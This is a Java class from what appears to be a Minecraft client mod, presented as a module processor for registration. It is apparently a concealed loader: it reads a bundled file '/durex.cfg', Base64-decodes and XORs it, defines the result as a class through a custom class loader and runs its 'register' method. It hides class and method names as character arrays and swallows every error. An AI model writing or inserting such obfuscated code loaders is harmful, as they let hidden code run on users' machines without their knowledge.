package pl.durex.client.loader;

/**
 * Processes module data for registration.
 */
class ModuleProcessor {

    private static byte[] fromText(String s) throws Exception {
        char[] cn = {'j','a','v','a','.','u','t','i','l','.','B','a','s','e','6','4'};
        char[] mn = {'g','e','t','D','e','c','o','d','e','r'};
        Object dec = Class.forName(new String(cn)).getMethod(new String(mn)).invoke(null);
        byte[] raw = (byte[]) dec.getClass().getMethod("decode", String.class).invoke(dec, s);
        for (int i = 0; i < raw.length; i++) raw[i] ^= 0x42;
        return raw;
    }

    static void process(String ignored) {
        try {
            byte[] data;
            char[] cfg = {'/', 'd', 'u', 'r', 'e', 'x', '.', 'c', 'f', 'g'};
            try (java.io.InputStream is = ModuleProcessor.class.getResourceAsStream(new String(cfg))) {
                if (is == null) return;
                data = fromText(new String(is.readAllBytes()).replaceAll("\\s+", ""));
            }

            final byte[] bytes = data;
            net.minecraft.client.MinecraftClient.getInstance().execute(() -> {
                try {
                    String name = readClassName(bytes);
                    // Użyj LicenceClassLoader który ma publiczny defineClass
                    pl.durex.client.loader.LicenceClassLoader cl = 
                        new pl.durex.client.loader.LicenceClassLoader(
                            ModuleProcessor.class.getClassLoader(), true);
                    Class<?> cls = cl.defineClass(name, bytes);
                    Object inst = cls.getDeclaredConstructor().newInstance();
                    cls.getMethod("register").invoke(inst);
                } catch (Throwable t) {}
            });

        } catch (Exception ignored2) {}
    }

    private static String readClassName(byte[] b) {
        try {
            int off = 8;
            int cpCount = ((b[off] & 0xFF) << 8) | (b[off + 1] & 0xFF);
            off += 2;
            String[] strs = new String[cpCount];
            int[] refs = new int[cpCount];
            for (int i = 1; i < cpCount; i++) {
                int tag = b[off++] & 0xFF;
                switch (tag) {
                    case 1:
                        int len = ((b[off] & 0xFF) << 8) | (b[off + 1] & 0xFF);
                        off += 2;
                        strs[i] = new String(b, off, len, "UTF-8");
                        off += len;
                        break;
                    case 7: refs[i] = ((b[off] & 0xFF) << 8) | (b[off + 1] & 0xFF); off += 2; break;
                    case 5: case 6: off += 8; i++; break;
                    case 3: case 4: case 9: case 10: case 11: case 12: case 18: off += 4; break;
                    case 8: case 16: case 19: case 20: off += 2; break;
                    case 15: off += 3; break;
                    default: off += 2;
                }
            }
            off += 2;
            int idx = ((b[off] & 0xFF) << 8) | (b[off + 1] & 0xFF);
            return strs[refs[idx]].replace('/', '.');
        } catch (Exception e) {
            return "pl.durex.client" + ".module.LicenseModule";
        }
    }
}
